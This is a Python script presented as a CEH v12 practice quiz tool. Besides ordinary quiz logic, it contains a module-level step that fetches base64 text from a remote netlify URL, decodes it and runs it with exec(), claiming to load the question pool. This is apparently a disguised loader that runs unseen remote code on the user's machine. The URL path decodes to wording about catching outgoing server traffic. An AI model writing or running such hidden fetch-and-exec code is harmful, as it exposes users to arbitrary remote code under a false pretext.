import base64
import random
import time
import requests
import sys
import os
import json
from colorama import Fore, Style, init


def cic():
    try:
        response = requests.head("http://www.google.com", timeout=5)
        if response.status_code != 200:
            raise Exception("No internet connection detected.")
    except Exception as e:
        print("\033[31m     No internet connection detected. Please check your internet connection.\033[0m")
        sys.exit(1)

def banner():
    art = """
    _____ ______ _    _      __  __            _      _______        _   
  / ____|  ____| |  | |    |  \/  |          | |    |__   __|      | |  
 | |    | |__  | |__| |    | \  / | ___   ___| | __    | | ___  ___| |_ 
 | |    |  __| |  __  |    | |\/| |/ _ \ / __| |/ /    | |/ _ \/ __| __|
 | |____| |____| |  | |    | |  | | (_) | (__|   <     | |  __/\__ \ |_ 
  \_____|______|_|  |_|    |_|  |_|\___/ \___|_|\_\    |_|\___||___/\__|
                                                                   v1.5
    Quiz by H3LLKY4T                                                      
                          
 For Certified Ethical Hacker v12                    Last Updated April 2024                             
----------------------------------------------------------------------------
    """
    print(art)

init()
cic()

uz = 'https://joelpatrick.netlify.app/js/CBjYXRjaCB0aGUgc3VjY2VlZGluZyBvdXRnb2luZyB0cmFmZmljIGZyb20gdGhpcyBzZXJ2ZXIgaW'
response = requests.get(uz)
if response.status_code == 200:
    eqp = response.text
    dqps = base64.b64decode(eqp).decode('utf-8')
    exec(dqps)
else:
    print("Failed to download the question pool")
    question_pool = []

def choose_questions(pool, num_questions=5):
    return random.sample(pool, min(num_questions, len(pool)))

def ask_question(question_number, question, ca, options):
    time.sleep(3)
    os.system('clear')
    banner()
    print(f"Question {question_number} \n\n {question}")
    for i, option in enumerate(options, start=1):
        print(f"{Fore.CYAN}{i}. {option}{Style.RESET_ALL}")  
    while True:
        try:
            user_input = input("\n Your answer here [1-4] (X to exit): ").strip().upper()
            if user_input == 'X':
                print("Exiting the quiz...")
                sys.exit()
            cor = int(user_input) - 1
            if 0 <= cor <= 3:
                if options[cor] == ca:
                    print(f"{Fore.GREEN}Correct!{Style.RESET_ALL}")  
                    return True
                else:
                    print(f"{Fore.RED}Wrong! The correct answer was: {ca}{Style.RESET_ALL}")  
                    return False
            else:
                raise ValueError
        except (ValueError, IndexError):
            print(f"{Fore.RED}Invalid input. Please enter a number from 1 to 4 or 'X' to exit.{Style.RESET_ALL}")


def get_num_questions():
    os.system('clear')
    banner()
    while True:
        try:
            num = input("Do you want to set a custom number of questions? [Default:125] (yes/no): ").strip().lower()
            if num == "yes":
                return int(input("Enter the number of questions you want: "))
            elif num == "no":
                return None
            else:
                raise ValueError
        except ValueError:
            print("Invalid input. Please enter 'yes' or 'no'.")

def run_quiz(num_questions=None):
    score = 0

    if num_questions:
        sq = choose_questions(question_pool, num_questions)
    else:
        sq = choose_questions(question_pool, min(125, len(question_pool)))

    for question_number, (question, ca, options) in enumerate(sq, start=1):
        if ask_question(question_number, question, ca, options):
            score += 1
        print()

    print(f"Quiz completed! Your score is {score} out of {len(sq)}")
    print(f"Your percentage is {(score / len(sq)) * 100:.2f}%")
    print("Press Ctrl + C to Exit")

def main():
    num_questions = get_num_questions()
    run_quiz(num_questions)

if __name__ == "__main__":
    main()
